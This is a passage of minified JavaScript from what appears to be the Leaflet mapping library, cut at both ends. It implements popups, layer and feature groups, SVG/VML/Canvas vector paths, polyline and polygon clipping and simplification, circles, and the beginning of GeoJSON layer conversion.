n.Point(5,5),className:"",zoomAnimation:!0},initialize:function(t,e){n.setOptions(this,t),this._source=e,this._animated=n.Browser.any3d&&this.options.zoomAnimation},onAdd:function(t){this._map=t,this._container||this._initLayout(),this._updateContent();var e=t.options.fadeAnimation;e&&n.DomUtil.setOpacity(this._container,0),t._panes.popupPane.appendChild(this._container),t.on("viewreset",this._updatePosition,this),this._animated&&t.on("zoomanim",this._zoomAnimation,this),t.options.closePopupOnClick&&t.on("preclick",this._close,this),this._update(),e&&n.DomUtil.setOpacity(this._container,1)},addTo:function(t){return t.addLayer(this),this},openOn:function(t){return t.openPopup(this),this},onRemove:function(t){t._panes.popupPane.removeChild(this._container),n.Util.falseFn(this._container.offsetWidth),t.off({viewreset:this._updatePosition,preclick:this._close,zoomanim:this._zoomAnimation},this),t.options.fadeAnimation&&n.DomUtil.setOpacity(this._container,0),this._map=null},setLatLng:function(t){return this._latlng=n.latLng(t),this._update(),this},setContent:function(t){return this._content=t,this._update(),this},_close:function(){var t=this._map;t&&(t._popup=null,t.removeLayer(this).fire("popupclose",{popup:this}))},_initLayout:function(){var t,e="leaflet-popup",i=e+" "+this.options.className+" leaflet-zoom-"+(this._animated?"animated":"hide"),o=this._container=n.DomUtil.create("div",i);this.options.closeButton&&(t=this._closeButton=n.DomUtil.create("a",e+"-close-button",o),t.href="#close",t.innerHTML="&#215;",n.DomEvent.disableClickPropagation(t),n.DomEvent.on(t,"click",this._onCloseButtonClick,this));var s=this._wrapper=n.DomUtil.create("div",e+"-content-wrapper",o);n.DomEvent.disableClickPropagation(s),this._contentNode=n.DomUtil.create("div",e+"-content",s),n.DomEvent.on(this._contentNode,"mousewheel",n.DomEvent.stopPropagation),this._tipContainer=n.DomUtil.create("div",e+"-tip-container",o),this._tip=n.DomUtil.create("div",e+"-tip",this._tipContainer)},_update:function(){this._map&&(this._container.style.visibility="hidden",this._updateContent(),this._updateLayout(),this._updatePosition(),this._container.style.visibility="",this._adjustPan())},_updateContent:function(){if(this._content){if("string"==typeof this._content)this._contentNode.innerHTML=this._content;else{for(;this._contentNode.hasChildNodes();)this._contentNode.removeChild(this._contentNode.firstChild);this._contentNode.appendChild(this._content)}this.fire("contentupdate")}},_updateLayout:function(){var t=this._contentNode,e=t.style;e.width="",e.whiteSpace="nowrap";var i=t.offsetWidth;i=Math.min(i,this.options.maxWidth),i=Math.max(i,this.options.minWidth),e.width=i+1+"px",e.whiteSpace="",e.height="";var o=t.offsetHeight,s=this.options.maxHeight,a="leaflet-popup-scrolled";s&&o>s?(e.height=s+"px",n.DomUtil.addClass(t,a)):n.DomUtil.removeClass(t,a),this._containerWidth=this._container.offsetWidth},_updatePosition:function(){if(this._map){var t=this._map.latLngToLayerPoint(this._latlng),e=this._animated,i=this.options.offset;e&&n.DomUtil.setPosition(this._container,t),this._containerBottom=-i.y-(e?0:t.y),this._containerLeft=-Math.round(this._containerWidth/2)+i.x+(e?0:t.x),this._container.style.bottom=this._containerBottom+"px",this._container.style.left=this._containerLeft+"px"}},_zoomAnimation:function(t){var e=this._map._latLngToNewLayerPoint(this._latlng,t.zoom,t.center);n.DomUtil.setPosition(this._container,e)},_adjustPan:function(){if(this.options.autoPan){var t=this._map,e=this._container.offsetHeight,i=this._containerWidth,o=new n.Point(this._containerLeft,-e-this._containerBottom);this._animated&&o._add(n.DomUtil.getPosition(this._container));var s=t.layerPointToContainerPoint(o),a=this.options.autoPanPadding,r=t.getSize(),h=0,l=0;0>s.x&&(h=s.x-a.x),s.x+i>r.x&&(h=s.x+i-r.x+a.x),0>s.y&&(l=s.y-a.y),s.y+e>r.y&&(l=s.y+e-r.y+a.y),(h||l)&&t.panBy(new n.Point(h,l))}},_onCloseButtonClick:function(t){this._close(),n.DomEvent.stop(t)}}),n.popup=function(t,e){return new n.Popup(t,e)},n.Marker.include({openPopup:function(){return this._popup&&this._map&&!this._map.hasLayer(this._popup)&&(this._popup.setLatLng(this._latlng),this._map.openPopup(this._popup)),this},closePopup:function(){return this._popup&&this._popup._close(),this},bindPopup:function(t,e){var i=n.point(this.options.icon.options.popupAnchor)||new n.Point(0,0);return i=i.add(n.Popup.prototype.options.offset),e&&e.offset&&(i=i.add(e.offset)),e=n.extend({offset:i},e),this._popup||this.on("click",this.openPopup,this).on("remove",this.closePopup,this).on("move",this._movePopup,this),t instanceof n.Popup?(n.setOptions(t,e),this._popup=t):this._popup=new n.Popup(e,this).setContent(t),this},setPopupContent:function(t){return this._popup&&this._popup.setContent(t),this},unbindPopup:function(){return this._popup&&(this._popup=null,this.off("click",this.openPopup).off("remove",this.closePopup).off("move",this._movePopup)),this},_movePopup:function(t){this._popup.setLatLng(t.latlng)}}),n.Map.include({openPopup:function(t){return this.closePopup(),this._popup=t,this.addLayer(t).fire("popupopen",{popup:this._popup})},closePopup:function(){return this._popup&&this._popup._close(),this}}),n.LayerGroup=n.Class.extend({initialize:function(t){this._layers={};var e,i;if(t)for(e=0,i=t.length;i>e;e++)this.addLayer(t[e])},addLayer:function(t){var e=this.getLayerId(t);return this._layers[e]=t,this._map&&this._map.addLayer(t),this},removeLayer:function(t){var e=this.getLayerId(t);return delete this._layers[e],this._map&&this._map.removeLayer(t),this},hasLayer:function(t){if(!t)return!1;var e=this.getLayerId(t);return this._layers.hasOwnProperty(e)},clearLayers:function(){return this.eachLayer(this.removeLayer,this),this},invoke:function(t){var e,i,n=Array.prototype.slice.call(arguments,1);for(e in this._layers)this._layers.hasOwnProperty(e)&&(i=this._layers[e],i[t]&&i[t].apply(i,n));return this},onAdd:function(t){this._map=t,this.eachLayer(t.addLayer,t)},onRemove:function(t){this.eachLayer(t.removeLayer,t),this._map=null},addTo:function(t){return t.addLayer(this),this},eachLayer:function(t,e){for(var i in this._layers)this._layers.hasOwnProperty(i)&&t.call(e,this._layers[i]);return this},getLayers:function(){var t=[];for(var e in this._layers)this._layers.hasOwnProperty(e)&&t.push(this._layers[e]);return t},setZIndex:function(t){return this.invoke("setZIndex",t)},getLayerId:function(t){return n.stamp(t)}}),n.layerGroup=function(t){return new n.LayerGroup(t)},n.FeatureGroup=n.LayerGroup.extend({includes:n.Mixin.Events,statics:{EVENTS:"click dblclick mouseover mouseout mousemove contextmenu"},addLayer:function(t){return this.hasLayer(t)?this:(t.on(n.FeatureGroup.EVENTS,this._propagateEvent,this),n.LayerGroup.prototype.addLayer.call(this,t),this._popupContent&&t.bindPopup&&t.bindPopup(this._popupContent,this._popupOptions),this.fire("layeradd",{layer:t}))},removeLayer:function(t){return t.off(n.FeatureGroup.EVENTS,this._propagateEvent,this),n.LayerGroup.prototype.removeLayer.call(this,t),this._popupContent&&this.invoke("unbindPopup"),this.fire("layerremove",{layer:t})},bindPopup:function(t,e){return this._popupContent=t,this._popupOptions=e,this.invoke("bindPopup",t,e)},setStyle:function(t){return this.invoke("setStyle",t)},bringToFront:function(){return this.invoke("bringToFront")},bringToBack:function(){return this.invoke("bringToBack")},getBounds:function(){var t=new n.LatLngBounds;return this.eachLayer(function(e){t.extend(e instanceof n.Marker?e.getLatLng():e.getBounds())}),t},_propagateEvent:function(t){t.layer||(t.layer=t.target),t.target=this,this.fire(t.type,t)}}),n.featureGroup=function(t){return new n.FeatureGroup(t)},n.Path=n.Class.extend({includes:[n.Mixin.Events],statics:{CLIP_PADDING:n.Browser.mobile?Math.max(0,Math.min(.5,(1280/Math.max(t.innerWidth,t.innerHeight)-1)/2)):.5},options:{stroke:!0,color:"#0033ff",dashArray:null,weight:5,opacity:.5,fill:!1,fillColor:null,fillOpacity:.2,clickable:!0},initialize:function(t){n.setOptions(this,t)},onAdd:function(t){this._map=t,this._container||(this._initElements(),this._initEvents()),this.projectLatlngs(),this._updatePath(),this._container&&this._map._pathRoot.appendChild(this._container),this.fire("add"),t.on({viewreset:this.projectLatlngs,moveend:this._updatePath},this)},addTo:function(t){return t.addLayer(this),this},onRemove:function(t){t._pathRoot.removeChild(this._container),this.fire("remove"),this._map=null,n.Browser.vml&&(this._container=null,this._stroke=null,this._fill=null),t.off({viewreset:this.projectLatlngs,moveend:this._updatePath},this)},projectLatlngs:function(){},setStyle:function(t){return n.setOptions(this,t),this._container&&this._updateStyle(),this},redraw:function(){return this._map&&(this.projectLatlngs(),this._updatePath()),this}}),n.Map.include({_updatePathViewport:function(){var t=n.Path.CLIP_PADDING,e=this.getSize(),i=n.DomUtil.getPosition(this._mapPane),o=i.multiplyBy(-1)._subtract(e.multiplyBy(t)._round()),s=o.add(e.multiplyBy(1+2*t)._round());this._pathViewport=new n.Bounds(o,s)}}),n.Path.SVG_NS="http://www.w3.org/2000/svg",n.Browser.svg=!(!e.createElementNS||!e.createElementNS(n.Path.SVG_NS,"svg").createSVGRect),n.Path=n.Path.extend({statics:{SVG:n.Browser.svg},bringToFront:function(){var t=this._map._pathRoot,e=this._container;return e&&t.lastChild!==e&&t.appendChild(e),this},bringToBack:function(){var t=this._map._pathRoot,e=this._container,i=t.firstChild;return e&&i!==e&&t.insertBefore(e,i),this},getPathString:function(){},_createElement:function(t){return e.createElementNS(n.Path.SVG_NS,t)},_initElements:function(){this._map._initPathRoot(),this._initPath(),this._initStyle()},_initPath:function(){this._container=this._createElement("g"),this._path=this._createElement("path"),this._container.appendChild(this._path)},_initStyle:function(){this.options.stroke&&(this._path.setAttribute("stroke-linejoin","round"),this._path.setAttribute("stroke-linecap","round")),this.options.fill&&this._path.setAttribute("fill-rule","evenodd"),this.options.pointerEvents&&this._path.setAttribute("pointer-events",this.options.pointerEvents),this.options.clickable||this.options.pointerEvents||this._path.setAttribute("pointer-events","none"),this._updateStyle()},_updateStyle:function(){this.options.stroke?(this._path.setAttribute("stroke",this.options.color),this._path.setAttribute("stroke-opacity",this.options.opacity),this._path.setAttribute("stroke-width",this.options.weight),this.options.dashArray?this._path.setAttribute("stroke-dasharray",this.options.dashArray):this._path.removeAttribute("stroke-dasharray")):this._path.setAttribute("stroke","none"),this.options.fill?(this._path.setAttribute("fill",this.options.fillColor||this.options.color),this._path.setAttribute("fill-opacity",this.options.fillOpacity)):this._path.setAttribute("fill","none")},_updatePath:function(){var t=this.getPathString();t||(t="M0 0"),this._path.setAttribute("d",t)},_initEvents:function(){if(this.options.clickable){(n.Browser.svg||!n.Browser.vml)&&this._path.setAttribute("class","leaflet-clickable"),n.DomEvent.on(this._container,"click",this._onMouseClick,this);for(var t=["dblclick","mousedown","mouseover","mouseout","mousemove","contextmenu"],e=0;t.length>e;e++)n.DomEvent.on(this._container,t[e],this._fireMouseEvent,this)}},_onMouseClick:function(t){this._map.dragging&&this._map.dragging.moved()||this._fireMouseEvent(t)},_fireMouseEvent:function(t){if(this.hasEventListeners(t.type)){var e=this._map,i=e.mouseEventToContainerPoint(t),o=e.containerPointToLayerPoint(i),s=e.layerPointToLatLng(o);this.fire(t.type,{latlng:s,layerPoint:o,containerPoint:i,originalEvent:t}),"contextmenu"===t.type&&n.DomEvent.preventDefault(t),"mousemove"!==t.type&&n.DomEvent.stopPropagation(t)}}}),n.Map.include({_initPathRoot:function(){this._pathRoot||(this._pathRoot=n.Path.prototype._createElement("svg"),this._panes.overlayPane.appendChild(this._pathRoot),this.options.zoomAnimation&&n.Browser.any3d?(this._pathRoot.setAttribute("class"," leaflet-zoom-animated"),this.on({zoomanim:this._animatePathZoom,zoomend:this._endPathZoom})):this._pathRoot.setAttribute("class"," leaflet-zoom-hide"),this.on("moveend",this._updateSvgViewport),this._updateSvgViewport())},_animatePathZoom:function(t){var e=this.getZoomScale(t.zoom),i=this._getCenterOffset(t.center)._multiplyBy(-e)._add(this._pathViewport.min);this._pathRoot.style[n.DomUtil.TRANSFORM]=n.DomUtil.getTranslateString(i)+" scale("+e+") ",this._pathZooming=!0},_endPathZoom:function(){this._pathZooming=!1},_updateSvgViewport:function(){if(!this._pathZooming){this._updatePathViewport();var t=this._pathViewport,e=t.min,i=t.max,o=i.x-e.x,s=i.y-e.y,a=this._pathRoot,r=this._panes.overlayPane;n.Browser.mobileWebkit&&r.removeChild(a),n.DomUtil.setPosition(a,e),a.setAttribute("width",o),a.setAttribute("height",s),a.setAttribute("viewBox",[e.x,e.y,o,s].join(" ")),n.Browser.mobileWebkit&&r.appendChild(a)}}}),n.Path.include({bindPopup:function(t,e){return t instanceof n.Popup?this._popup=t:((!this._popup||e)&&(this._popup=new n.Popup(e,this)),this._popup.setContent(t)),this._popupHandlersAdded||(this.on("click",this._openPopup,this).on("remove",this.closePopup,this),this._popupHandlersAdded=!0),this},unbindPopup:function(){return this._popup&&(this._popup=null,this.off("click",this._openPopup).off("remove",this.closePopup),this._popupHandlersAdded=!1),this},openPopup:function(t){return this._popup&&(t=t||this._latlng||this._latlngs[Math.floor(this._latlngs.length/2)],this._openPopup({latlng:t})),this},closePopup:function(){return this._popup&&this._popup._close(),this},_openPopup:function(t){this._popup.setLatLng(t.latlng),this._map.openPopup(this._popup)}}),n.Browser.vml=!n.Browser.svg&&function(){try{var t=e.createElement("div");t.innerHTML='<v:shape adj="1"/>';var i=t.firstChild;return i.style.behavior="url(#default#VML)",i&&"object"==typeof i.adj}catch(n){return!1}}(),n.Path=n.Browser.svg||!n.Browser.vml?n.Path:n.Path.extend({statics:{VML:!0,CLIP_PADDING:.02},_createElement:function(){try{return e.namespaces.add("lvml","urn:schemas-microsoft-com:vml"),function(t){return e.createElement("<lvml:"+t+' class="lvml">')}}catch(t){return function(t){return e.createElement("<"+t+' xmlns="urn:schemas-microsoft.com:vml" class="lvml">')}}}(),_initPath:function(){var t=this._container=this._createElement("shape");n.DomUtil.addClass(t,"leaflet-vml-shape"),this.options.clickable&&n.DomUtil.addClass(t,"leaflet-clickable"),t.coordsize="1 1",this._path=this._createElement("path"),t.appendChild(this._path),this._map._pathRoot.appendChild(t)},_initStyle:function(){this._updateStyle()},_updateStyle:function(){var t=this._stroke,e=this._fill,i=this.options,n=this._container;n.stroked=i.stroke,n.filled=i.fill,i.stroke?(t||(t=this._stroke=this._createElement("stroke"),t.endcap="round",n.appendChild(t)),t.weight=i.weight+"px",t.color=i.color,t.opacity=i.opacity,t.dashStyle=i.dashArray?i.dashArray instanceof Array?i.dashArray.join(" "):i.dashArray.replace(/ *, */g," "):""):t&&(n.removeChild(t),this._stroke=null),i.fill?(e||(e=this._fill=this._createElement("fill"),n.appendChild(e)),e.color=i.fillColor||i.color,e.opacity=i.fillOpacity):e&&(n.removeChild(e),this._fill=null)},_updatePath:function(){var t=this._container.style;t.display="none",this._path.v=this.getPathString()+" ",t.display=""}}),n.Map.include(n.Browser.svg||!n.Browser.vml?{}:{_initPathRoot:function(){if(!this._pathRoot){var t=this._pathRoot=e.createElement("div");t.className="leaflet-vml-container",this._panes.overlayPane.appendChild(t),this.on("moveend",this._updatePathViewport),this._updatePathViewport()}}}),n.Browser.canvas=function(){return!!e.createElement("canvas").getContext}(),n.Path=n.Path.SVG&&!t.L_PREFER_CANVAS||!n.Browser.canvas?n.Path:n.Path.extend({statics:{CANVAS:!0,SVG:!1},redraw:function(){return this._map&&(this.projectLatlngs(),this._requestUpdate()),this},setStyle:function(t){return n.setOptions(this,t),this._map&&(this._updateStyle(),this._requestUpdate()),this},onRemove:function(t){t.off("viewreset",this.projectLatlngs,this).off("moveend",this._updatePath,this),this.options.clickable&&this._map.off("click",this._onClick,this),this._requestUpdate(),this._map=null},_requestUpdate:function(){this._map&&!n.Path._updateRequest&&(n.Path._updateRequest=n.Util.requestAnimFrame(this._fireMapMoveEnd,this._map))},_fireMapMoveEnd:function(){n.Path._updateRequest=null,this.fire("moveend")},_initElements:function(){this._map._initPathRoot(),this._ctx=this._map._canvasCtx},_updateStyle:function(){var t=this.options;t.stroke&&(this._ctx.lineWidth=t.weight,this._ctx.strokeStyle=t.color),t.fill&&(this._ctx.fillStyle=t.fillColor||t.color)},_drawPath:function(){var t,e,i,o,s,a;for(this._ctx.beginPath(),t=0,i=this._parts.length;i>t;t++){for(e=0,o=this._parts[t].length;o>e;e++)s=this._parts[t][e],a=(0===e?"move":"line")+"To",this._ctx[a](s.x,s.y);this instanceof n.Polygon&&this._ctx.closePath()}},_checkIfEmpty:function(){return!this._parts.length},_updatePath:function(){if(!this._checkIfEmpty()){var t=this._ctx,e=this.options;this._drawPath(),t.save(),this._updateStyle(),e.fill&&(t.globalAlpha=e.fillOpacity,t.fill()),e.stroke&&(t.globalAlpha=e.opacity,t.stroke()),t.restore()}},_initEvents:function(){this.options.clickable&&(this._map.on("mousemove",this._onMouseMove,this),this._map.on("click",this._onClick,this))},_onClick:function(t){this._containsPoint(t.layerPoint)&&this.fire("click",t)},_onMouseMove:function(t){this._map._animatingZoom||(this._containsPoint(t.layerPoint)?(this._ctx.canvas.style.cursor="pointer",this._mouseInside=!0,this.fire("mouseover",t)):this._mouseInside&&(this._ctx.canvas.style.cursor="",this._mouseInside=!1,this.fire("mouseout",t)))}}),n.Map.include(n.Path.SVG&&!t.L_PREFER_CANVAS||!n.Browser.canvas?{}:{_initPathRoot:function(){var t,i=this._pathRoot;i||(i=this._pathRoot=e.createElement("canvas"),i.style.position="absolute",t=this._canvasCtx=i.getContext("2d"),t.lineCap="round",t.lineJoin="round",this._panes.overlayPane.appendChild(i),this.options.zoomAnimation&&(this._pathRoot.className="leaflet-zoom-animated",this.on("zoomanim",this._animatePathZoom),this.on("zoomend",this._endPathZoom)),this.on("moveend",this._updateCanvasViewport),this._updateCanvasViewport())},_updateCanvasViewport:function(){if(!this._pathZooming){this._updatePathViewport();var t=this._pathViewport,e=t.min,i=t.max.subtract(e),o=this._pathRoot;n.DomUtil.setPosition(o,e),o.width=i.x,o.height=i.y,o.getContext("2d").translate(-e.x,-e.y)}}}),n.LineUtil={simplify:function(t,e){if(!e||!t.length)return t.slice();var i=e*e;return t=this._reducePoints(t,i),t=this._simplifyDP(t,i)},pointToSegmentDistance:function(t,e,i){return Math.sqrt(this._sqClosestPointOnSegment(t,e,i,!0))},closestPointOnSegment:function(t,e,i){return this._sqClosestPointOnSegment(t,e,i)},_simplifyDP:function(t,e){var n=t.length,o=typeof Uint8Array!=i+""?Uint8Array:Array,s=new o(n);s[0]=s[n-1]=1,this._simplifyDPStep(t,s,e,0,n-1);var a,r=[];for(a=0;n>a;a++)s[a]&&r.push(t[a]);return r},_simplifyDPStep:function(t,e,i,n,o){var s,a,r,h=0;for(a=n+1;o-1>=a;a++)r=this._sqClosestPointOnSegment(t[a],t[n],t[o],!0),r>h&&(s=a,h=r);h>i&&(e[s]=1,this._simplifyDPStep(t,e,i,n,s),this._simplifyDPStep(t,e,i,s,o))},_reducePoints:function(t,e){for(var i=[t[0]],n=1,o=0,s=t.length;s>n;n++)this._sqDist(t[n],t[o])>e&&(i.push(t[n]),o=n);return s-1>o&&i.push(t[s-1]),i},clipSegment:function(t,e,i,n){var o,s,a,r=n?this._lastCode:this._getBitCode(t,i),h=this._getBitCode(e,i);for(this._lastCode=h;;){if(!(r|h))return[t,e];if(r&h)return!1;o=r||h,s=this._getEdgeIntersection(t,e,o,i),a=this._getBitCode(s,i),o===r?(t=s,r=a):(e=s,h=a)}},_getEdgeIntersection:function(t,e,o,s){var a=e.x-t.x,r=e.y-t.y,h=s.min,l=s.max;return 8&o?new n.Point(t.x+a*(l.y-t.y)/r,l.y):4&o?new n.Point(t.x+a*(h.y-t.y)/r,h.y):2&o?new n.Point(l.x,t.y+r*(l.x-t.x)/a):1&o?new n.Point(h.x,t.y+r*(h.x-t.x)/a):i},_getBitCode:function(t,e){var i=0;return t.x<e.min.x?i|=1:t.x>e.max.x&&(i|=2),t.y<e.min.y?i|=4:t.y>e.max.y&&(i|=8),i},_sqDist:function(t,e){var i=e.x-t.x,n=e.y-t.y;return i*i+n*n},_sqClosestPointOnSegment:function(t,e,i,o){var s,a=e.x,r=e.y,h=i.x-a,l=i.y-r,u=h*h+l*l;return u>0&&(s=((t.x-a)*h+(t.y-r)*l)/u,s>1?(a=i.x,r=i.y):s>0&&(a+=h*s,r+=l*s)),h=t.x-a,l=t.y-r,o?h*h+l*l:new n.Point(a,r)}},n.Polyline=n.Path.extend({initialize:function(t,e){n.Path.prototype.initialize.call(this,e),this._latlngs=this._convertLatLngs(t)},options:{smoothFactor:1,noClip:!1},projectLatlngs:function(){this._originalPoints=[];for(var t=0,e=this._latlngs.length;e>t;t++)this._originalPoints[t]=this._map.latLngToLayerPoint(this._latlngs[t])},getPathString:function(){for(var t=0,e=this._parts.length,i="";e>t;t++)i+=this._getPathPartStr(this._parts[t]);return i},getLatLngs:function(){return this._latlngs},setLatLngs:function(t){return this._latlngs=this._convertLatLngs(t),this.redraw()},addLatLng:function(t){return this._latlngs.push(n.latLng(t)),this.redraw()},spliceLatLngs:function(){var t=[].splice.apply(this._latlngs,arguments);return this._convertLatLngs(this._latlngs,!0),this.redraw(),t},closestLayerPoint:function(t){for(var e,i,o=1/0,s=this._parts,a=null,r=0,h=s.length;h>r;r++)for(var l=s[r],u=1,c=l.length;c>u;u++){e=l[u-1],i=l[u];var _=n.LineUtil._sqClosestPointOnSegment(t,e,i,!0);o>_&&(o=_,a=n.LineUtil._sqClosestPointOnSegment(t,e,i))}return a&&(a.distance=Math.sqrt(o)),a},getBounds:function(){var t,e,i=new n.LatLngBounds,o=this.getLatLngs();for(t=0,e=o.length;e>t;t++)i.extend(o[t]);return i},_convertLatLngs:function(t,e){var i,o,s=e?t:[];for(i=0,o=t.length;o>i;i++){if(n.Util.isArray(t[i])&&"number"!=typeof t[i][0])return;s[i]=n.latLng(t[i])}return s},_initEvents:function(){n.Path.prototype._initEvents.call(this)},_getPathPartStr:function(t){for(var e,i=n.Path.VML,o=0,s=t.length,a="";s>o;o++)e=t[o],i&&e._round(),a+=(o?"L":"M")+e.x+" "+e.y;return a},_clipPoints:function(){var t,e,o,s=this._originalPoints,a=s.length;if(this.options.noClip)return this._parts=[s],i;this._parts=[];var r=this._parts,h=this._map._pathViewport,l=n.LineUtil;for(t=0,e=0;a-1>t;t++)o=l.clipSegment(s[t],s[t+1],h,t),o&&(r[e]=r[e]||[],r[e].push(o[0]),(o[1]!==s[t+1]||t===a-2)&&(r[e].push(o[1]),e++))},_simplifyPoints:function(){for(var t=this._parts,e=n.LineUtil,i=0,o=t.length;o>i;i++)t[i]=e.simplify(t[i],this.options.smoothFactor)},_updatePath:function(){this._map&&(this._clipPoints(),this._simplifyPoints(),n.Path.prototype._updatePath.call(this))}}),n.polyline=function(t,e){return new n.Polyline(t,e)},n.PolyUtil={},n.PolyUtil.clipPolygon=function(t,e){var i,o,s,a,r,h,l,u,c,_=[1,4,2,8],p=n.LineUtil;for(o=0,l=t.length;l>o;o++)t[o]._code=p._getBitCode(t[o],e);for(a=0;4>a;a++){for(u=_[a],i=[],o=0,l=t.length,s=l-1;l>o;s=o++)r=t[o],h=t[s],r._code&u?h._code&u||(c=p._getEdgeIntersection(h,r,u,e),c._code=p._getBitCode(c,e),i.push(c)):(h._code&u&&(c=p._getEdgeIntersection(h,r,u,e),c._code=p._getBitCode(c,e),i.push(c)),i.push(r));t=i}return t},n.Polygon=n.Polyline.extend({options:{fill:!0},initialize:function(t,e){var i,o,s;if(n.Polyline.prototype.initialize.call(this,t,e),t&&n.Util.isArray(t[0])&&"number"!=typeof t[0][0])for(this._latlngs=this._convertLatLngs(t[0]),this._holes=t.slice(1),i=0,o=this._holes.length;o>i;i++)s=this._holes[i]=this._convertLatLngs(this._holes[i]),s[0].equals(s[s.length-1])&&s.pop();t=this._latlngs,t[0].equals(t[t.length-1])&&t.pop()},projectLatlngs:function(){if(n.Polyline.prototype.projectLatlngs.call(this),this._holePoints=[],this._holes){var t,e,i,o;for(t=0,i=this._holes.length;i>t;t++)for(this._holePoints[t]=[],e=0,o=this._holes[t].length;o>e;e++)this._holePoints[t][e]=this._map.latLngToLayerPoint(this._holes[t][e])}},_clipPoints:function(){var t=this._originalPoints,e=[];if(this._parts=[t].concat(this._holePoints),!this.options.noClip){for(var i=0,o=this._parts.length;o>i;i++){var s=n.PolyUtil.clipPolygon(this._parts[i],this._map._pathViewport);s.length&&e.push(s)}this._parts=e}},_getPathPartStr:function(t){var e=n.Polyline.prototype._getPathPartStr.call(this,t);return e+(n.Browser.svg?"z":"x")}}),n.polygon=function(t,e){return new n.Polygon(t,e)},function(){function t(t){return n.FeatureGroup.extend({initialize:function(t,e){this._layers={},this._options=e,this.setLatLngs(t)},setLatLngs:function(e){var i=0,n=e.length;for(this.eachLayer(function(t){n>i?t.setLatLngs(e[i++]):this.removeLayer(t)},this);n>i;)this.addLayer(new t(e[i++],this._options));return this}})}n.MultiPolyline=t(n.Polyline),n.MultiPolygon=t(n.Polygon),n.multiPolyline=function(t,e){return new n.MultiPolyline(t,e)},n.multiPolygon=function(t,e){return new n.MultiPolygon(t,e)}}(),n.Rectangle=n.Polygon.extend({initialize:function(t,e){n.Polygon.prototype.initialize.call(this,this._boundsToLatLngs(t),e)},setBounds:function(t){this.setLatLngs(this._boundsToLatLngs(t))},_boundsToLatLngs:function(t){return t=n.latLngBounds(t),[t.getSouthWest(),t.getNorthWest(),t.getNorthEast(),t.getSouthEast()]}}),n.rectangle=function(t,e){return new n.Rectangle(t,e)},n.Circle=n.Path.extend({initialize:function(t,e,i){n.Path.prototype.initialize.call(this,i),this._latlng=n.latLng(t),this._mRadius=e},options:{fill:!0},setLatLng:function(t){return this._latlng=n.latLng(t),this.redraw()},setRadius:function(t){return this._mRadius=t,this.redraw()},projectLatlngs:function(){var t=this._getLngRadius(),e=new n.LatLng(this._latlng.lat,this._latlng.lng-t),i=this._map.latLngToLayerPoint(e);this._point=this._map.latLngToLayerPoint(this._latlng),this._radius=Math.max(Math.round(this._point.x-i.x),1)},getBounds:function(){var t=this._getLngRadius(),e=360*(this._mRadius/40075017),i=this._latlng,o=new n.LatLng(i.lat-e,i.lng-t),s=new n.LatLng(i.lat+e,i.lng+t);return new n.LatLngBounds(o,s)},getLatLng:function(){return this._latlng},getPathString:function(){var t=this._point,e=this._radius;return this._checkIfEmpty()?"":n.Browser.svg?"M"+t.x+","+(t.y-e)+"A"+e+","+e+",0,1,1,"+(t.x-.1)+","+(t.y-e)+" z":(t._round(),e=Math.round(e),"AL "+t.x+","+t.y+" "+e+","+e+" 0,"+23592600)},getRadius:function(){return this._mRadius},_getLatRadius:function(){return 360*(this._mRadius/40075017)},_getLngRadius:function(){return this._getLatRadius()/Math.cos(n.LatLng.DEG_TO_RAD*this._latlng.lat)},_checkIfEmpty:function(){if(!this._map)return!1;var t=this._map._pathViewport,e=this._radius,i=this._point;return i.x-e>t.max.x||i.y-e>t.max.y||i.x+e<t.min.x||i.y+e<t.min.y}}),n.circle=function(t,e,i){return new n.Circle(t,e,i)},n.CircleMarker=n.Circle.extend({options:{radius:10,weight:2},initialize:function(t,e){n.Circle.prototype.initialize.call(this,t,null,e),this._radius=this.options.radius},projectLatlngs:function(){this._point=this._map.latLngToLayerPoint(this._latlng)},_updateStyle:function(){n.Circle.prototype._updateStyle.call(this),this.setRadius(this.options.radius)},setRadius:function(t){return this.options.radius=this._radius=t,this.redraw()}}),n.circleMarker=function(t,e){return new n.CircleMarker(t,e)},n.Polyline.include(n.Path.CANVAS?{_containsPoint:function(t,e){var i,o,s,a,r,h,l,u=this.options.weight/2;for(n.Browser.touch&&(u+=10),i=0,a=this._parts.length;a>i;i++)for(l=this._parts[i],o=0,r=l.length,s=r-1;r>o;s=o++)if((e||0!==o)&&(h=n.LineUtil.pointToSegmentDistance(t,l[s],l[o]),u>=h))return!0;return!1}}:{}),n.Polygon.include(n.Path.CANVAS?{_containsPoint:function(t){var e,i,o,s,a,r,h,l,u=!1;if(n.Polyline.prototype._containsPoint.call(this,t,!0))return!0;for(s=0,h=this._parts.length;h>s;s++)for(e=this._parts[s],a=0,l=e.length,r=l-1;l>a;r=a++)i=e[a],o=e[r],i.y>t.y!=o.y>t.y&&t.x<(o.x-i.x)*(t.y-i.y)/(o.y-i.y)+i.x&&(u=!u);return u}}:{}),n.Circle.include(n.Path.CANVAS?{_drawPath:function(){var t=this._point;this._ctx.beginPath(),this._ctx.arc(t.x,t.y,this._radius,0,2*Math.PI,!1)},_containsPoint:function(t){var e=this._point,i=this.options.stroke?this.options.weight/2:0;return t.distanceTo(e)<=this._radius+i}}:{}),n.GeoJSON=n.FeatureGroup.extend({initialize:function(t,e){n.setOptions(this,e),this._layers={},t&&this.addData(t)},addData:function(t){var e,i,o=n.Util.isArray(t)?t:t.features;if(o){for(e=0,i=o.length;i>e;e++)(o[e].geometries||o[e].geometry||o[e].features)&&this.addData(o[e]);return this}var s=this.options;if(!s.filter||s.filter(t)){var a=n.GeoJSON.geometryToLayer(t,s.pointToLayer);return a.feature=t,a.defaultOptions=a.options,this.resetStyle(a),s.onEachFeature&&s.onEachFeature(t,a),this.addLayer(a)}},resetStyle:function(t){var e=this.options.style;e&&(n.Util.extend(t.options,t.defaultOptions),this._setLayerStyle(t,e))},setStyle:function(t){this.eachLayer(function(e){this._setLayerStyle(e,t)},this)},_setLayerStyle:function(t,e){"function"==typeof e&&(e=e(t.feature)),t.setStyle&&t.setStyle(e)}}),n.extend(n.GeoJSON,{geometryToLayer:function(t,e){var i,o,s,a,r,h="Feature"===t.type?t.geometry:t,l=h.coordinates,u=[];switch(h.type){case"Point":return i=this.coordsToLatLng(l),e?e(t,i):new n.Marker(i);case"MultiPoint":for(s=0,a=l.length;a>s;s++)i=this.coordsToLatLng(l[s]),r=e?e(t,i):new n.Marker(i),u.push(r);return new n.FeatureGroup(u);case"LineString":return o=this.coordsToLatLngs(l),new n.Polyline(o);case"Polygon":return o=this.coordsToLatLngs(l,1),new n.Polygon(o);case"MultiLineString":return o=this.coordsToLatLngs(l,1),new n.MultiPolyline(o);case"MultiPolygon":return 